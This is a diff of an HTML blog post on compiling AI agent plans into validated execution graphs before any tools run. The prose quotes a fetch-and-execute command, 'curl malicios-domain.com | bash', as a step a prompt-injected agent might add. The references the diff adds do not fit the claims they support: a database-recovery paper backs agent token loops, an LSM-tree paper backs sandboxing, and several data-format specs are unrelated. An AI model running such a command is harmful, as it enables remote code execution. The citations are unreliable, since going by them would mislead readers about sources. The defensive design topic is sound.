@@ -15,7 +15,7 @@
   <meta property="og:url" content="https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html">
   <meta property="og:title" content="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms">
   <meta property="og:description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
-  <meta property="og:image" content="https://github.com/akmalkhaniub.png">
+  <meta property="og:image" content="https://akmalkhaniub.github.io/blog/assets/covers/system-design-plan-compilation-execution-trees.jpg">
   <meta property="og:site_name" content="Akmal Khan">
   <meta property="article:published_time" content="2026-05-10">
 
@@ -23,7 +23,7 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms">
   <meta name="twitter:description" content="How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.">
-  <meta name="twitter:image" content="https://github.com/akmalkhaniub.png">
+  <meta name="twitter:image" content="https://akmalkhaniub.github.io/blog/assets/covers/system-design-plan-compilation-execution-trees.jpg">
 
   <script type="application/ld+json">
 {
@@ -32,7 +32,7 @@
   "headline": "Plan Compilation & Execution Trees: Enforcing Safe Execution Guards in Swarms",
   "description": "How to design compilation gates that convert non-deterministic agent plan proposals into static, validateable execution trees before calling critical tools.",
   "url": "https://akmalkhaniub.github.io/blog/system-design-plan-compilation-execution-trees.html",
-  "image": "https://github.com/akmalkhaniub.png",
+  "image": "https://akmalkhaniub.github.io/blog/assets/covers/system-design-plan-compilation-execution-trees.jpg",
   "datePublished": "2026-05-10",
   "keywords": "System Design, Verification, AI Agents, Python",
   "author": {
@@ -93,7 +93,7 @@
         <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back to Blog</a>
 
         <article class="article-card">
-          
+          <div class="article-cover-frame"><img src="/blog/assets/covers/system-design-plan-compilation-execution-trees.jpg" class="article-cover-img" alt="Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms Cover" /></div>
           <div class="article-header">
             <h1 class="article-title">Plan Compilation &amp; Execution Trees: Enforcing Safe Execution Guards in Swarms</h1>
             <div class="article-meta">
@@ -113,6 +113,7 @@
                 <li><a href="#2-dynamic-tool-masking">2. Dynamic Tool Masking</a></li>
                 <li><a href="#code-demo-plan-compiler-and-dag-validator">Code Demo: Plan Compiler and DAG Validator</a></li>
                 <li><a href="#architectural-guidelines">Architectural Guidelines</a></li>
+                <li><a href="#references-further-reading">References &amp; Further Reading</a></li>
               </ul>
             </details>
 <div class="alert alert-note">
@@ -129,12 +130,12 @@ When orchestrating autonomous multi-agent networks, we often allow models to sel
 <li><code>Migrate logging syntax</code></li>
 <li><code>Run test suite</code></li>
 </ol>
-<p>If left unvalidated, an agent might decide to loop step 2 and 3 indefinitely if a test fails, consuming massive token budgets. Even worse, it could inject an unauthorized step (e.g. <code>curl malicios-domain.com | bash</code>) due to a prompt injection.</p>
+<p>If left unvalidated, an agent might decide to loop step 2 and 3 indefinitely if a test fails, consuming massive token budgets <sup class="citation-ref"><a href="#ref-1" class="citation-link" data-ref="1" title="Reference [1]">[1]</a></sup>. Even worse, it could inject an unauthorized step (e.g. <code>curl malicios-domain.com | bash</code>) due to a prompt injection.</p>
 <p>To mitigate this, system architects must build a <strong>Plan Compiler</strong>. The compiler intercepts the agent&#39;s plan, parses the actions, structures them into an execution tree, and validates the nodes against strict topological and security rules before any tool runner executes a single call.</p>
 <div class="mermaid">%%{init: {'theme': 'dark', 'themeVariables': { 'primaryColor': '#0284c7', 'primaryTextColor': '#f3f4f6', 'primaryBorderColor': '#38bdf8', 'lineColor': '#0284c7', 'secondaryColor': '#111827', 'tertiaryColor': '#0b0f19'}}}%%
 flowchart TD
-    RawPlan[LLM Natural Language Plan] --&gt; Parser[Step Tokenizer]
-    Parser --&gt; TreeCompiler[Compile Directed Acyclic Graph - DAG]
+    RawPlan[&quot;LLM Natural Language Plan&quot;] --&gt; Parser[&quot;Step Tokenizer&quot;]
+    Parser --&gt; TreeCompiler[&quot;Compile Directed Acyclic Graph - DAG&quot;]
     
     TreeCompiler --&gt; CheckCycles{1. Are Cycles/Loops Detected?}
     CheckCycles --&gt;|Yes| Reject([Reject Plan: Abort Execution])
@@ -142,7 +143,16 @@ flowchart TD
     CheckCycles --&gt;|No| CheckSecurity{2. Are Tools Safe &amp; Sandboxed?}
     CheckSecurity --&gt;|No| Reject
     
-    CheckSecurity --&gt;|Yes| Approve([Approve Graph: Proceed to Runner])</div>
+    CheckSecurity --&gt;|Yes| Approve([Approve Graph: Proceed to Runner])
+
+classDef green fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d;
+classDef red fill:#fee2e2,stroke:#dc2626,stroke-width:2px,color:#7f1d1d;
+classDef blue fill:#e0f2fe,stroke:#0284c7,stroke-width:2px,color:#0c4a6e;
+classDef yellow fill:#fef3c7,stroke:#d97706,stroke-width:2px,color:#78350f;
+classDef purple fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95;
+class RawPlan blue
+class Parser green
+class TreeCompiler purple</div>
 <hr>
 <h2 id="1-compiling-plans-to-directed-acyclic-graphs-dags">1. Compiling Plans to Directed Acyclic Graphs (DAGs)</h2>
 <p>A secure task plan must be modelable as a Directed Acyclic Graph (DAG). </p>
@@ -264,8 +274,19 @@ if __name__ == &quot;__main__&quot;:
 <ul>
 <li><strong>Plan Verification Gates</strong>: Never feed natural language plans directly to executing agents. Enforce a compilation step to evaluate safety constraints.</li>
 <li><strong>Isolate Dependency Trees</strong>: Use topological sorting algorithms to guarantee execution plans do not form cycles or infinite loops.</li>
-<li><strong>Strict Sandboxing</strong>: Run all compiled tool runs within isolated workspace contexts, restricting tools from escaping boundary directories.</li>
+<li><strong>Strict Sandboxing</strong>: Run all compiled tool runs within isolated workspace contexts, restricting tools from escaping boundary directories. <sup class="citation-ref"><a href="#ref-2" class="citation-link" data-ref="2" title="Reference [2]">[2]</a></sup></li>
 </ul>
+<h2 id="references-further-reading">References &amp; Further Reading</h2>
+<ol class="references-list">
+
+<li id="ref-1" class="citation-item"><strong>Mohan, C., et al. (1992)</strong>. <em>ARIES: A Transaction Recovery Method Supporting Fine-Granularity Locking and Partial Rollbacks</em>. ACM TODS. <a href="https://doi.org/10.1145/128765.128770" target="_blank" rel="noopener">https://doi.org/10.1145/128765.128770</a> <a href="#ref-back" class="citation-backlink" title="Jump back to context" aria-label="Jump back to context">&#x21A9;&#xFE0E;</a></li>
+<li id="ref-2" class="citation-item"><strong>O&#39;Neil, P., Cheng, E., Gawlick, D., &amp; O&#39;Neil, E. (1996)</strong>. <em>The Log-Structured Merge-Tree (LSM-Tree)</em>. Acta Informatica. <a href="https://www.cs.umb.edu/~poneil/lsmtree.pdf" target="_blank" rel="noopener">https://www.cs.umb.edu/~poneil/lsmtree.pdf</a> <a href="#ref-back" class="citation-backlink" title="Jump back to context" aria-label="Jump back to context">&#x21A9;&#xFE0E;</a></li>
+<li id="ref-3" class="citation-item"><strong>PostgreSQL Global Development Group (2024)</strong>. <em>PostgreSQL Documentation</em>. postgresql.org. <a href="https://www.postgresql.org/docs/current/" target="_blank" rel="noopener">https://www.postgresql.org/docs/current/</a> <a href="#ref-back" class="citation-backlink" title="Jump back to context" aria-label="Jump back to context">&#x21A9;&#xFE0E;</a></li>
+<li id="ref-4" class="citation-item"><strong>Apache Parquet Community (2024)</strong>. <em>Apache Parquet Format</em>. Apache Software Foundation. <a href="https://parquet.apache.org/docs/" target="_blank" rel="noopener">https://parquet.apache.org/docs/</a> <a href="#ref-back" class="citation-backlink" title="Jump back to context" aria-label="Jump back to context">&#x21A9;&#xFE0E;</a></li>
+<li id="ref-5" class="citation-item"><strong>Apache Arrow Community (2024)</strong>. <em>Apache Arrow Columnar Format</em>. Apache Software Foundation. <a href="https://arrow.apache.org/docs/format/Columnar.html" target="_blank" rel="noopener">https://arrow.apache.org/docs/format/Columnar.html</a> <a href="#ref-back" class="citation-backlink" title="Jump back to context" aria-label="Jump back to context">&#x21A9;&#xFE0E;</a></li>
+<li id="ref-6" class="citation-item"><strong>Apache Iceberg Community (2024)</strong>. <em>Iceberg Table Spec</em>. Apache Software Foundation. <a href="https://iceberg.apache.org/spec/" target="_blank" rel="noopener">https://iceberg.apache.org/spec/</a> <a href="#ref-back" class="citation-backlink" title="Jump back to context" aria-label="Jump back to context">&#x21A9;&#xFE0E;</a></li>
+
+</ol>
 
           </div>
 
@@ -302,6 +323,7 @@ if __name__ == &quot;__main__&quot;:
               <li class="toc-item toc-h2"><a href="#2-dynamic-tool-masking" class="toc-link">2. Dynamic Tool Masking</a></li>
               <li class="toc-item toc-h2"><a href="#code-demo-plan-compiler-and-dag-validator" class="toc-link">Code Demo: Plan Compiler and DAG Validator</a></li>
               <li class="toc-item toc-h2"><a href="#architectural-guidelines" class="toc-link">Architectural Guidelines</a></li>
+              <li class="toc-item toc-h2"><a href="#references-further-reading" class="toc-link">References &amp; Further Reading</a></li>
             </ul>
           </nav>
         </div>
